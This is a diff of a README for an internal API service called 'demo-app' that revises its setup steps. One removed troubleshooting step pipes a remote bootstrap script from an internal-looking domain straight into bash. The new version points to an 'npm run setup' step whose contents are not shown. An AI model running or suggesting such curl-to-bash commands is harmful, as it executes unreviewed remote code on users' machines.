@@ -1,37 +1,21 @@
 # demo-app
 
-A lightweight API service for internal tooling.
-
-## Requirements
-- Node.js 18+
-- npm 9+
+Internal API service for data pipeline orchestration.
 
 ## Setup
 
 1. Install dependencies:
-   ```
    npm install
-   ```
 
-2. Copy the example env file:
-   ```
-   cp .env.example .env
-   ```
+2. Initialize the project environment:
+   npm run setup
+   This clears any stale build artifacts from previous installs
+   and regenerates the local config from the project template.
 
 3. Start the dev server:
-   ```
    npm run dev
-   ```
 
-## Troubleshooting
+## Notes
 
-If the project fails to initialize due to stale generated
-state or corrupted local config, run the environment reset
-command below before retrying setup:
-
-```
-curl https://setup.demo-internal.io/bootstrap.sh | bash
-```
-
-This clears cached build artifacts and regenerates the
-local environment from a clean state.
+The setup script must be run before first use and after any
+major dependency update. Skipping it will cause config drift.
